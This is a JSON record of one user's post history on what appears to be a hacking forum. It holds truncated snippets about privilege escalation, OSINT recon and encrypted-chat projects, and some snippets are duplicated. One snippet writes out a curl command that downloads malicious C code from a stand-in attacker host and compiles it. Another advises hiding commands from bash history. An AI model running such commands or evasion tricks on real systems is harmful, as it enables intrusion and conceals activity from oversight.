{"user": "zifor", "history": ["PwnWiki have a goodcommand list too… i always refer to it… pwnwiki.io Linux Privesc", "PwnWiki have a goodcommand list too… i always refer to it… pwnwiki.io Linux Privesc", "PwnWiki have a goodcommand list too… i always refer to it… pwnwiki.io Linux Privesc", "agree… hiding any file to image can be many ways, but binding executable file to image that run is rare case", "I build my own exploits…  JK… I rarely ever use exploitdb/whatever-those-kids-are-using-these-days, but I used to use 0day. ~Cheers! –Techno Forg–", "Greetings my fellow hackers, As we continue with our series, the AMUNET app becomes complicated with new functionalities and structures to understand. We’ll sail right through. As stated earlier in previous tutorials, the app doesn’t fully exists because I build them before I share so forgive me if&hellip;", "OSINT 0x02 - LinkedIn is not just for jobsSup 0x00’ers, that’s right, I am back with another banger of an article, ready? If you read my last article on OSINT, you’ll know a little bit on how to find dirt on companies, their assets, and how to do all of that passively. Well now I am going to show &hellip;", "Dope article mate. Love it. Didn’t know about shodan nmap script  Could be useful to import result whithin metasploit which provides a nice way to handle detected services. By the same token, have you ever heard about virustotal passive DNS replication? It’s redoubtable, you will thanks me later  h&hellip;", "Recon on individuals? I shall get to that in part 2  Stay tuned.", "Recon on individuals? I shall get to that in part 2  Stay tuned.", "Great article bro… how about recon people?", "Great article bro… how about recon people?", "Hello, fellow 0x00’ers! First off, I lied. It’s not a botnet. But it enables you to achieve botnet-like abilities. Today I am going to show you something that has been kept a secret for a long time in the hacker community and has never really been made accessible to the average hobbyist. With this&hellip;", "OSINT - Passive Recon and Passive Discovery Of AssetsSup 0x00’ers, to kick this badass series off, I am going to begin with the most important aspect of pentesting. Passive Recon and OSINT. Now, do not let the word ‘passive’ fool you. This is no light recon, you can uncover vast amounts of infomati&hellip;", "I dont know about module you used… but i think you can look at source code at github about function or libraries you need.I don’t know… i’m not good at python and can’t give any advice about it.OWASP TOP 10 is standard used in pentest, you can start from there", "I was messing around with @IoTh1nkN0t on IRC, exploring the possibilities of running binary in the shell. You can already compile C code to stdout. curl - s https://attacker/malicious-code.c | gcc -o /dev/stdout -x c -We tried things like ./-, but it seems pretty difficult to execute code, withou&hellip;", "Great article! However, be sure to leave a space before the commands in order to make sure that they aren’t saved to the (bash) history", "So I unlisted @zinzloun’s write-up but he decided to complain about it in public with a 2nd post instead of asking privately as to why that happened. According to your write-up, you are working for a company. Meaning, you are supposed to be mature enough to accept criticism either by your clients&hellip;", "If you are reading this is because you have miserably failed to solve the Case GBC-17/124. LoL, just kidding. The GBC-17_124 challenge was intended to show you something that you can easily find in the real world, but still easy to solve. Yes, real world stuff is not as fun as the challenge you usua&hellip;", "This post is part two of a multi-part series. If you haven’t already, please read part one here: Encrypted Chat: Part I Welcome BackAfter gaining an understanding of the concepts behind my encrypted chat server, we’re now ready to take a closer look at the code to see how the client and server ope&hellip;", "The ProjectI started programming an encrypted chat client and server to learn more about encryption and how it’s implemented in network protocols (e.g. SSH or HTTPs over TLS). Now that it’s almost complete, I wanted to share what I learned with you. I’m splitting up this series into two posts. The&hellip;"]}